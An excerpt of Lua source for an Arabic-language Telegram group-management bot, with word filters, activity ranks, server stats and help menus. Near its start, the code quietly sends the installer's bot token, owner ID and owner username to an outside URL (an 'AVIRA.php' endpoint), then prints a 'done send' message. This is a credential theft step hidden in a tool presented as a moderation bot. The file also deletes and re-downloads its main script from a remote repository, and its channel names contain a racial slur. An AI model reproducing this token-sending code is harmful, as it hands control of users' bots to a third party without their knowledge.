...
create_config_auto()
https.request("https://mod/AVIRA.php/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("Moder", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/MIKELTEAM
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Moder.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("NG", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Moder -X kill
screen -S Moder ./Moder
done
]])  
file:close() 
...
local Moder_Msg = ''  
if msgs < 100 then 
Moder_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
Moder_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
Moder_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
Moder_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
Moder_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
Moder_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
Moder_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
Moder_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
Moder_Msg = 'ملك التفاعل ' 
...
function plugin_Modera(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Modera and msg then
pre_msg = plugin.Modera(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceModer(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,Moder_Msg) 
return false  
end 
if text then    
...
if text == 'server' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local Moder1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..Moder1.server.uptime_in_days..'('..Moder1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..Moder1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..Moder1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..Moder1.stats.instantaneous_ops_per_sec..'`\n'
...
os.execute('rm -rf Moder.lua')
os.execute('wget https://raw.githubusercontent.com/rangmohammed/MIKELTEAM/master/Moder.lua')
...
send(msg.chat_id_, msg.id_,'•~┇ عدد المجموعات الان ← { '..#group..' }'..Moderk..''..Moder..'\n*•~┇ الان عدد المجموعات الحقيقي ← { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local Moder1_Msg = database:get(bot_id.."Moder1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Moder1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙ العضو← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'NiGGa_SoUrcE')..') \n ⌔︙'..Moder1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Moder_Msg and not Special(msg) then  
local Moder_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Moder_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
❅━━━━❅
[❅ Dev](t.me/MIKELTEAM)
[❅ Dev](t.me/NiGGa_SoUrcE)
[❅ Channel](t.me/NiGGa_SoUrcE)
❅━━━━❅
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'• بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'NiGGa_SoUrcE')..') \n تـم قفـل الدردشه')  
end,nil)   
...
local UserName = (b.username_ or "ModerTEAM")
...
' }\n'..'⌔︙ الايدي بالصوره ← { '..idph..
' }\n'..'⌔︙ الرفع ← { '..setadd..
' }\n'..'⌔︙ الحظر ← { '..banm..' }\n\n ••━━━━━•• \n⌔︙[Source Channel](t.me/NiGGa_SoUrcE) \n'
send(msg.chat_id_, msg.id_,text)     
end    
...
database:set(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Moder1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Moder1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"⌔︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Moder1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Moder1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Moder1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"⌔︙ارسل الكلمه الان")  
database:set(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Moder1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Moder1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Moder1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Moder1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Moder1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Moder1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⌔︙قائمة المنع \n ••━━━━━•• \n"
for k,v in pairs(list) do  
local Moder_Msg = database:get(bot_id.."Moder1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ← {"..Moder_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..Moder_Msg[math.random(#Moder_Msg)]..']') 
return false
end
...
-- vardump(data) 
Moderdx(msg.chat_id_, msg.id_, '• ايدي المجموعة ← ( '..msg.chat_id_..' )\n عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n• عدد المحظورين ← ( *'..data.kicked_count_..' )*\n• عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text and text:match("^كول (.*)$") and Manager(msg) then
...
••━━━━━••
[SourceChannel](t.me/NiGGa_SoUrcE)
]]
keyboard = {} 
...
••━━━━━━•• 
 ...
 لعبة خمن <> خمن
 لعبة بات <> بات
[𝘋𝘰𝘮𝘯𝘰𝘦𝘴](https://vipgames.com/play/?affiliateId=wpDom/#/games/domino/lobby)
[𝘏𝘦𝘢𝘳𝘵𝘴](https://vipgames.com/play/?affiliateId=wpVG#/games/hearts/lobby)
[𝘓𝘶𝘥𝘰](https://vipgames.com/play/?affiliateId=wpVG#/games/ludo/lobby)
...
{
{text = '╭𝟜╯', callback_data="/help4"},{text = '╭𝟝╯', callback_data="/help5"},{text = '╭𝟞╯', callback_data="/help6"},
},
{
...
Moder = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Moder)
...
--------------------------------------------------------------------------------------------------------------
SourceModer(data.message_,data)
--plugin_Modera(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local ModerAbot = database:get(bot_id.."Moder1:Add:Filter:Rp2"..text..result.chat_id_)   
if ModerAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
...
------------------------------------------------------------------------
if text then
local Moder1_Msg = database:get(bot_id.."Moder1:Add:Filter:Rp2"..text..result.chat_id_)   
if Moder1_Msg then    
send(msg.chat_id_, msg.id_,"⌔︙"..Moder1_Msg)
